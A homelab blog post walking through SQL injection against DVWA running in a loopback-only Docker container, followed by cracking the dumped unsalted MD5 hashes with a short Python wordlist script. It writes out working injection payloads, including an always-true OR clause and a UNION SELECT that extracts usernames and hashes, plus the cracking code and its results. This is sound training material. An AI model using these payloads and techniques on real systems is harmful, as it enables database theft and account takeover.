---
title: "SQL Injection 101: From Auth Bypass to Cracked Hashes on My Own VPS"
date: 2026-08-13
draft: false
tags: ["security", "dvwa", "sql-injection", "docker", "homelab"]
---

I spent an afternoon breaking into my own database. The SQL injection part went exactly like the tutorials say it will. The interesting part — the part I actually want to write down for future me — was the two dead-end tools I hit afterward, trying to crack the password hashes I'd just stolen.

## Setting up a target I'm allowed to attack

I run a small self-hosted VPS for practice labs, separate from my day job. It also runs a Minecraft server for friends, which meant step one was making sure nothing I was about to do could touch that. More on that in a second.

I wanted a deliberately vulnerable web app to practice on, and Docker made that trivial. First, the engine itself, via Docker's official apt repo:

```bash
sudo apt remove $(dpkg --get-selections docker.io docker-compose docker-compose-v2 docker-doc docker-buildx podman-docker containerd runc | cut -f1)
sudo apt update && sudo apt install ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

sudo tee /etc/apt/sources.list.d/docker.sources <<EOF
Types: deb
URIs: https://download.docker.com/linux/ubuntu
Suites: $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}")
Components: stable
Architectures: $(dpkg --print-architecture)
Signed-By: /etc/apt/keyrings/docker.asc
EOF

sudo apt update
sudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo docker run hello-world
```

That last line is the sanity check — it pulls a tiny test image and prints a confirmation message. If you see that, Docker's actually working, not just installed.

For the target itself I went with **DVWA** (Damn Vulnerable Web Application) — it's the standard training-wheels option for web app pentesting, and it ships as an all-in-one Docker image with Apache, PHP, and MariaDB baked in. DVWA's own docs are blunt about this: don't expose it to the internet, it's intentionally full of holes. So the whole point of the setup below was making sure it *couldn't* be reachable from anywhere but me.

```bash
docker network create vulnlab
docker pull vulnerables/web-dvwa
docker run -d --name dvwa --network vulnlab -p 127.0.0.1:4280:80 vulnerables/web-dvwa
docker ps
```

The important flag there is `-p 127.0.0.1:4280:80` — binding to loopback instead of `0.0.0.0`. That means the container's port literally isn't reachable from outside the box, firewall or no firewall. To actually use it, I tunneled in over SSH from my own laptop:

```bash
ssh -L 4280:127.0.0.1:4280 root@your-vps-ip -p 31337
```

(Swap in your own VPS IP and SSH port — mine isn't 31337, but you get the idea. Keep that number off the public internet if you've ever moved SSH off port 22 for a reason.)

With the tunnel up, `http://localhost:4280` in a browser got me to DVWA's setup page. Clicked **Create/Reset Database**, logged in with the default `admin`/`password`, and I was in.

**Quick paranoia check:** Minecraft was actually running the whole time I was doing this. Different ports (`25565`/`8100` vs. `4280`), loopback-only binding, and Docker only touches iptables rules for its *own* published ports — so there was no actual conflict. Worth checking for yourself rather than assuming, but in this case it was a non-issue.

## Breaking the query

DVWA's SQL Injection module has one text box — a "User ID" field. Enter a normal ID, get a normal result:

```
1
```

→ one row back: `admin`, `admin`.

That tells you the app is building a query roughly like:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

...and just splicing your input straight into the string. If that's true, you're not limited to typing numbers — you can type SQL:

```
1' OR '1'='1
```

That turns the query into `WHERE user_id = '1' OR '1'='1'` — and since `'1'='1'` is always true, the whole WHERE clause becomes true for *every row*. Instead of one user, all five in DVWA's seed database came back. Confirmed: the app was treating my input as code, not just data.

From there, `UNION SELECT` lets you glue a second query's results onto the first, as long as the column count and types line up. The original query returns two text columns, so:

```
1' UNION SELECT user, password FROM users #
```

...pulls two *different* text columns instead — username and password hash — and DVWA has no way to tell it apart from the columns it meant to show. Out came all five:

```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```

Small thing worth noticing before you even try to crack anything: `admin` and `smithy` have the *identical* hash. That's unsalted MD5 doing what unsalted MD5 does — same password in, same hash out, no matter who typed it. You don't need to crack a thing to know those two accounts share a password; the matching hash tells you outright. That's the whole argument for salting in one screenshot.

## Where it went sideways: John the Ripper doesn't do what I expected

Cracking an unsalted MD5 hash isn't reversing math — it's guessing. Hash a candidate word, compare it to the target, repeat. John the Ripper is the classic tool for this, so:

```bash
sudo apt install john
john --format=Raw-MD5 --wordlist=/usr/share/john/password.lst dvwa_hashes.txt
```

```
Unknown ciphertext format name requested
```

Not the error I expected. I tried to get John to tell me what it actually supports:

```bash
john --list=formats | grep -i md5
```

```
Unknown option: "--list=formats"
```

That second error was the real tell. It turns out Ubuntu's `apt install john` gives you the stripped-down "core" build of John the Ripper — the one with a genuinely short list of supported formats (Unix-style `crypt`, `md5crypt`, `bcrypt`, and a few others), no raw MD5 support, and it doesn't even implement `--list=formats`. Most tutorials that show `Raw-MD5` working assume the community "Jumbo" edition, which is what Kali ships by default and what you get if you compile from source — not what `apt` gives you on plain Ubuntu.

I had three options at that point: compile Jumbo John from source, install hashcat (which supports raw MD5 fine, but wants a GPU and tends to need extra OpenCL/CPU driver setup on a bare VPS — a real chance of a second dead end), or just write the ten lines of Python that do exactly what either tool would do under the hood. I went with the third one.

## Cracking it myself

```python
import hashlib

# Load our target hashes: username -> hash
targets = {}
with open("/root/dvwa_hashes.txt") as f:
    for line in f:
        line = line.strip()
        if not line:
            continue
        user, h = line.split(":", 1)
        targets[user] = h

# Load candidate passwords to try
with open("/usr/share/john/password.lst", encoding="latin-1") as f:
    words = [w.strip() for w in f if w.strip()]

# Try every word against every hash
found = {}
for word in words:
    guess_hash = hashlib.md5(word.encode()).hexdigest()
    for user, h in targets.items():
        if user not in found and guess_hash == h:
            found[user] = word

# Report results
for user, h in targets.items():
    if user in found:
        print(f"{user}: CRACKED -> {found[user]}")
    else:
        print(f"{user}: not found in this wordlist")
```

I reused John's bundled wordlist (`/usr/share/john/password.lst`) even though John itself couldn't use it against these hashes — no reason to waste it. Ran the script:

```
admin: CRACKED -> password
gordonb: CRACKED -> abc123
1337: not found in this wordlist
pablo: CRACKED -> letmein
smithy: CRACKED -> password
```

Four out of five. `smithy` coming back as `password` — same as `admin` — was exactly what the matching hash had already told me before I cracked anything.

`1337` not cracking isn't really a failure — it's the honest result. That password just isn't a word in the ~3,000-word list I used. This is the actual dynamic behind real-world password cracking: it's not that MD5 is "weak" in some absolute sense, it's that cracking success is a direct function of wordlist size and quality versus how common the password is. A weird password survives a small list. `password` does not.

## Where I left it

Four cracked hashes and a working understanding of why the fifth didn't fall — that felt like a solid place to stop for the day. I haven't touched DVWA's other modules yet (command injection, XSS, file upload, the rest), and Juice Shop and Metasploitable are still untouched too. That's the next session, not this post.

If you're doing this yourself: the SQL injection part will probably go exactly how you expect. Budget your real troubleshooting time for the tooling around it instead — in my case, that meant finding out the hard way that "apt install X" and "the X everyone's tutorial assumes" aren't always the same binary.
